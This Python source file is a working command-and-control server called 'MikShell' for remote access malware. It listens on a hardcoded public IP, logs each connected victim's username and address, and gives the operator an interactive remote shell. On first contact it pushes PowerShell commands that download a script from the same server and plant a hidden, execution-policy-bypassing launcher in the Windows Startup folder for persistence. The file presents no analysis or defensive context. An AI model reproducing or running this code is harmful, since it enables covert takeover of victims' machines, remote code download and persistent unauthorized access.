# Imports
from colorama import Fore
from colorama import Style
import json

import socket
from _thread import *
import time
import os
import sqlite3
con = sqlite3.connect('mikshells.db')
cur = con.cursor()

con.execute("""CREATE TABLE IF NOT EXISTS users(
    info TEXT PRIMARY KEY
);""")
con.commit()

# Declarations
host = '176.58.105.100'
port = 80
ThreadCount = 0

onlines = {}

macros = {
    "startup": {"args": [], "steps": [
            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://176.58.105.100:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
            "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
            "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
            "cd ~"
        ]},
    "discord-message": {"args": ["to", "message"], "steps": [
        ""
    ]}
    
}


def client_handler(connection):
    con = sqlite3.connect('mikshells.db')
    cur = con.cursor()

    connection.send('whoami'.encode("utf-8"))
    data = connection.recv(1024).decode("utf-8")
    try:
        whoami = json.loads(data)["out"].replace("\n", "").replace("\r", "").replace("[OK]", "")
    except:
        return
    # Check if data.decode("utf-8")+" "+connection.getpeername()[0] in database if not add it
    cur.execute("SELECT info FROM users;")
    values = cur.fetchall()
    user = whoami+" "+connection.getpeername()[0]
    already_exists = not all(
        [x[0] != user for x in values])
    if not already_exists:
        con.execute("INSERT INTO users VALUES (?);",
                    (user, ))
        con.commit()
        startup_steps = [
            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://176.58.105.100:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
            "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
            "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
        ]
        for step in startup_steps:
            try:
                connection.send(step.encode("utf-8"))
                connection.recv(2048*8).decode("utf-8")
            except ConnectionResetError:
                break
    onlines[user
            ] = {'connection': connection, 'address': connection.getpeername(), 'path': json.loads(data)["path"].replace("\n", "").replace("\r", "")}
    while onlines.get(user) != None:
        time.sleep(1)
    connection.close()


def accept_connections(ServerSocket):
    Client, address = ServerSocket.accept()
    start_new_thread(client_handler, (Client, ))


def start_server(host, port):
    ServerSocket = socket.socket()
    try:
        ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ServerSocket.bind((host, port))
    except socket.error as e:
        print(str(e))

    ServerSocket.listen()

    while True:
        accept_connections(ServerSocket)


def macro():
    cur.execute("SELECT info FROM users;")
    avalible = []
    for row in cur.fetchall():
        if row[0] in onlines.keys():
            avalible.append(row[0])
    if len(avalible) == 0:
        print("No users avalible ;(")
        return
    print("_"*max(map(len, avalible))+"__")
    [print(f"{Fore.GREEN}{x[0]+1}.{Style.RESET_ALL} {x[1]}") for x in enumerate(avalible)]
    print("_"*max(map(len, avalible))+"__")
    print("Enter the number of the user you want to send a macro to:")
    try:
        user = avalible[int(input())-1]
    except:
        print("Invalid input")
        return
    for num, macrotype in enumerate(macros.keys()):
        print(f"{Fore.GREEN}{num+1}.{Style.RESET_ALL} {macrotype}")
    print("Enter the number of the macro you want to send:")
    try:
        macrotype = list(macros.keys())[int(input())-1]
    except Exception as e:
        print("Invalid input")
        return
    args = []
    for arg in macros[macrotype]["args"]:
        print(f"Enter the {arg} argument:")
        args.append(input())
    steps = macros[macrotype]["steps"]
    for step in steps:
        try:
            onlines[user]["connection"].send(step.encode("utf-8"))
            back = json.loads(onlines[user]["connection"].recv(2048*8).decode("utf-8"))
            print(back["out"])
        except ConnectionResetError:
            print("Connection reset")
            break
        except:
            print("Error")
            break

    


def shell():
    cur.execute("SELECT info FROM users;")
    avalible = []
    for row in cur.fetchall():
        if row[0] in onlines.keys():
            avalible.append(row[0])
    if len(avalible) == 0:
        print("No users avalible ;(")
        return
    print("_"*max(map(len, avalible))+"__")
    [print(f"{Fore.GREEN}{x[0]+1}.{Style.RESET_ALL} {x[1]}") for x in enumerate(avalible)]
    user = input("Select a shell by using the number: ")
    if int(user)-1 in range(len(avalible)):
        user = avalible[int(user)-1]
    os.system("clear" if os.name == "posix" else "cls")
    print(f"{Fore.GREEN}Entering shell for {user} Type 'mikshell-exit' to get back to the mikshell commandline\n\n{Style.RESET_ALL}")
    shell_command = input(
        f"MikShell|{user.split(' ')[0]}|{user.split(' ')[1]}|\n{onlines[user]['path']}>")
    while shell_command != "mikshell-exit":
        try:
            onlines[user]['connection'].send(shell_command.encode("utf-8"))
            data = onlines[user]['connection'].recv(2048*32).decode("utf-8")
        except ConnectionResetError:
            print("Connection lost")
            onlines.pop(user)
            break
        try:
            print(data)
            json_data = json.loads(data)
        except Exception as e:
            print(e)
            print(data)
            break

        print(f"{Fore.RED if json_data['status'] == 'ERR' else ''}{json_data['out']}{Style.RESET_ALL if json_data['status'] == 'ERR' else ''}") if data != 0x1 else ""
        path = json_data['path'].replace("\n", "").replace("\r", "")
        onlines[user]['path'] = path
        shell_command = input(
            f"MikShell|{user.split(' ')[0]}|{user.split(' ')[1]}|\n{path}>")


def console():
    print(f"""
    
 __    __     __     __  __    {Fore.CYAN} ______     __  __     ______     __         __        {Style.RESET_ALL}
/\ "-./  \   /\ \   /\ \/ /    {Fore.CYAN}/\  ___\   /\ \_\ \   /\  ___\   /\ \       /\ \       {Style.RESET_ALL}
\ \ \-./\ \  \ \ \  \ \  _"-.  {Fore.CYAN}\ \___  \  \ \  __ \  \ \  __\   \ \ \____  \ \ \____  {Style.RESET_ALL}
 \ \_\ \ \_\  \ \_\  \ \_\ \_\ {Fore.CYAN} \/\_____\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_____\ {Style.RESET_ALL}
  \/_/  \/_/   \/_/   \/_/\/_/ {Fore.CYAN}  \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_____/ {Style.RESET_ALL}
                                                                                      

    """)
    print(f"""
    ╭――――――――――――――――――――――――――――――――――――╮
    │                                    │
    │              Run Info              │
    │{"Port: "+str(port)}{(36-len("Port: "+str(port)))*" "}│
    │{"Host: "+host}{(36-len("Host: "+host))*" "}│
    │                                    │
    ╰――――――――――――――――――――――――――――――――――――╯ 
    """)
    while True:
        command = input("MikShell>")
        if command == 'exit':
            break
        elif command == "shell":
            shell()
        elif command == 'status':
            cur.execute("SELECT info FROM users;")
            for row in cur.fetchall():
                status = f"{Fore.GREEN}online{Style.RESET_ALL}" if row[0] in onlines.keys(
                ) else f"{Fore.RED}offline{Style.RESET_ALL}"
                print(row[0]+" "+status)
        elif command == 'clear':
            os.system("clear" if os.name == "posix" else "cls")
        elif command == 'macro':
            macro()
        else:
            print('Invalid command')


if __name__ == '__main__':
    start_new_thread(start_server, (host, port))
    console()
